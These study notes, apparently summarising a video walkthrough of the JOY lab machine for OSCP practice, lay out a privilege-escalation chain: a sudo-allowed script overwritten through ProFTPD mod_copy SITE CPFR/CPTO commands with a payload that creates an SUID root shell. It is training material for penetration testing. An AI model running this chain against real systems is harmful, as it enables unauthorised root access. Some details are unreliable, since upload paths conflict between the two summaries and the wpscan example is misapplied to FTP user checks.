This is a comprehensive summary of the notes, commands, and key concepts from the "JOY Walkthrough with S1REN (Lightning Round\!)" video, which demonstrates an OSCP-style machine exploitation.

The primary vectors covered are the identification of credentials, the misuse of a `sudo` allowed script, and the exploitation of the **ProFTPD** service with the **`mod_copy`** command to achieve a **Root Shell**.

-----

## 🔑 Key Takeaways & OSCP Concepts

The video emphasizes several crucial practices for the OSCP exam and penetration testing:

| Concept | Action/Reasoning | Timestamp |
| :--- | :--- | :--- |
| **Comprehensive Enumeration** | Get as much practice as you can enumerating **each and every service** to get every scrap of information. | [[12:05](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=725)] |
| **Always Check `sudo`** | Run `sudo -l` **every single time** you switch to a new user to check their permissions. | [[09:57](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=597)], [[13:53](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=833)] |
| **Lateral Movement** | If you notice other users but no viable vectors for local privilege escalation, attempt to move laterally. | [[13:36](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=816)] |
| **File Overwriting** | Always ask: "Can we overwrite sensitive files?" If you can overwrite a file that is executed by a privileged process (like `sudo`), you win. | [[14:00](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=840)] |
| **ProFTPD `mod_copy`** | If **ProFTPD** is running, ensure that `mod_copy` is disabled by default. When enabled, it allows a malicious actor to plant files with absolute pathing. | [[13:00](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=780)] |

-----

## ⚙️ Exploit Walkthrough & Commands

### 1\. Initial Access (User Access)

The walkthrough quickly moves past the initial web enumeration, noting that credentials for the user **patrick** were exfiltrated from an interesting file found in `/var/www/os_sec` [[09:38](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=578)].

  * **Switch User:**
    ```bash
    su patrick
    ```

### 2\. Privilege Escalation to Root

The path to root involves two main steps: identifying a `sudo` opportunity and using the `ProFTPD` service to overwrite the target file.

#### A. Identifying the Sudo Vector

After gaining access as `patrick`, the first step is to check permissions:

  * **Sudo Check:**
    ```bash
    sudo -l
    ```
  * **Finding:** The check reveals that the user `patrick` can execute a specific script with `sudo` (as root): `/home/patrick/script/test` [[10:07](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=607)].

#### B. The ProFTPD `mod_copy` Exploit

The goal is to overwrite the executable script `/home/patrick/script/test` with a payload that grants a root shell. This is achieved by exploiting the ProFTPD service's `mod_copy` functionality.

1.  **Create the SUID Payload (on your attacker machine):**
    The payload command copies the `/bin/dash` shell and sets the SUID bit on the copy.

      * *Note: This command is usually put into a file and then uploaded, which is then used by the FTP site copy command.*

    <!-- end list -->

    ```bash
    # This command is executed on the target as root via sudo, 
    # and it is the contents of the file that will overwrite the script.
    echo 'cp /bin/dash /var/temp/dash; chmod u+s /var/temp/dash' > payload_file_name
    ```

2.  **Overwrite the Script using FTP:**

      * Connect to the target machine's FTP service (default port 21) using a tool like `netcat` with verbose output.
      * The `SITE CPFR` and `SITE CPTO` (Copy From and Copy To) commands are used to move files using absolute paths on the server's filesystem, exploiting the enabled `mod_copy`.

    <!-- end list -->

    ```bash
    # 1. Connect to the FTP service on the target IP
    nc -nv <TARGET_IP> 21 

    # 2. Use the SITE COPY commands to plant your file:
    # Set the source of the copy (from the anonymous FTP upload directory)
    SITE CPFR /home/ftp/upload/test [11:14] 

    # Set the destination (overwriting the script Patrick can run with sudo)
    SITE CPTO /home/patrick/script/test [11:24]
    ```

3.  **Execute the Payload:**

      * Switch to the shell you gained as `patrick` and execute the overwritten script with `sudo`:

    <!-- end list -->

    ```bash
    sudo /home/patrick/script/test [11:43]
    ```

    This command, executed as root via `sudo`, now runs the payload, which creates the SUID shell `/var/temp/dash`.

4.  **Final Root Shell:**

      * Navigate to the location of the SUID shell and execute it:

    <!-- end list -->

    ```bash
    cd /var/temp [11:57]
    ./dash [11:59]
    whoami # -> root
    ```

### 3\. Post-Exploitation Commands (For Reporting)

Once you have root access, you should run commands to stabilize your shell and gather the required proof for your report.

  * **Fix Environment Path (to run commands like `ifconfig`):**
    ```bash
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin [09:00]
    ```
  * **Fix Terminal Color/Functionality:**
    ```bash
    export TERM=xterm-256color [08:18]
    ```
  * **Gather Proof (for OSCP report):**
    ```bash
    ifconfig; hostname; id [09:18]
    ```

-----

You can rewatch the walkthrough here: [JOY Walkthrough with S1REN (Lightning Round\!)](http://www.youtube.com/watch?v=6EyEdKFlJIs)
http://googleusercontent.com/youtube_content/0

=============================================================================================================================

This video provides a **Lightning Round** walkthrough of the **JOY** vulnerable machine, focusing on a critical privilege escalation exploit involving a misconfigured FTP service and a weak `sudo` rule. The initial access steps are summarized, but the core lesson is the exploit chain used to gain root access.

-----

## 🔑 OSCP Notes: JOY Walkthrough (ProFTPD Exploit)

The successful exploitation of the JOY machine relies on two combined vulnerabilities: a misconfigured **ProFTPD** service with `mod_copy` enabled and a weak `sudo` rule that allows a user to execute a controlled file.

### I. Initial Access and Lateral Movement (Summarized)

The walkthrough skips the initial enumeration but confirms the following steps were taken:

  * A reconnaissance step (likely on a web service) led to finding credentials for the user **patrick**.
  * Lateral movement was performed by switching the user context to `patrick`.
  * A key prerequisite was that the user **patrick** had a rule allowing them to run a script with `sudo` permissions. The exact rule was not displayed in the command, but the logic was to exploit the file located at `/home/patrick/script/test`.

### II. Core Privilege Escalation Chain

The central exploit uses the **ProFTPD `mod_copy`** vulnerability to plant a file into the specific directory that the user `patrick` is allowed to execute with `sudo`.

| Step | Goal | Command/Action | Notes & Explanation |
| :--- | :--- | :--- | :--- |
| **1. Create SUID Payload** | Generate a malicious script that creates an **SUID-enabled shell** and names it `test`. | `echo 'cp /bin/dash /var/temp/dash; chmod u+s /var/temp/dash' > test` | This script copies the `/bin/dash` shell to `/var/temp/` and sets the **SUID (Set User ID)** bit, meaning it will run with the permissions of the file's owner (which will be `root` after the next steps). |
| **2. Upload Payload (FTP)** | Upload the `test` file to a world-writable directory accessible by the FTP service. | `ftp 192.168.1.167` (Login: `anonymous`/`anonymous`) then `put test` | Upload the local malicious script to the FTP server. |
| **3. Exploit `mod_copy`** | Use the ProFTPD **`SITE CPFR/CPTO`** commands via `netcat` to move the malicious file into the target `sudo` execution path. | `nc $IP 21`<br>`SITE CPFR /home/patrick/ftp_upload/test`<br>`SITE CPTO /home/patrick/script/test` | **This is the critical step.** The `mod_copy` feature allows copying files between *absolute* paths on the server. The script is moved from the public upload folder to the specific directory where `sudo` will execute it. |
| **4. Execute SUID Script** | Run the newly planted script using `sudo`. | `sudo /home/patrick/script/test` | The script, now located in the `sudo`-allowed path, is executed as `root` (due to the misconfigured `sudo` rule), which then creates the SUID shell in `/var/temp`. |
| **5. Achieve Root** | Execute the SUID shell. | `cd /var/temp`<br>`./dash` | The `dash` binary executes, and because it has the SUID bit set, the resulting session is a **root** shell (`whoami` returns `root`). |

-----

## 💡 Key Takeaway Concepts & Commands

### 1\. The Dangers of ProFTPD `mod_copy`

  * The key lesson is to **always check FTP services for version and configuration**. The **ProFTPD `mod_copy`** module is extremely dangerous when enabled, as it allows users (including anonymous users, if configured) to copy files to arbitrary absolute paths on the server. [[13:10](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=790)]
  * **Command:** The exploit is executed by issuing raw FTP commands using `netcat` to leverage the `SITE CPFR` (Copy File From) and `SITE CPTO` (Copy File To) functionalities.

### 2\. Privilege Escalation via Weak `sudo` Rules

  * A common mistake is allowing a non-root user to execute a script or binary with `sudo` permissions when that file is either **world-writable** or located in a directory where the user can plant a custom payload.
  * The **`sudo -l`** command is always the first and most critical step for local enumeration. [[13:53](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=833)]

### 3\. General Enumeration Tools

  * **FTP User Verification:** If an FTP service is found, a tool like `wpscan` in **verify** mode (which also checks for users) or other user enumeration tools can be used against a wordlist to confirm valid usernames on the system (e.g., checking for the user `patrick`). [[12:47](http://www.youtube.com/watch?v=6EyEdKFlJIs&t=767)]
      * *Command:* `wpscan --url $IP -P /usr/share/wordlists/rockyou.txt --mode verify` (using `wpscan` as an example for user checking, though `wpscan` is typically for WordPress).
  * **Check for SUID/SGID:** The core of the root-level payload involves setting an SUID bit. An attacker often looks for existing SUID binaries with the command:
      * *Command:* `find / -perm -u=s -type f 2>/dev/null`

http://googleusercontent.com/youtube_content/2

===============================================================================================










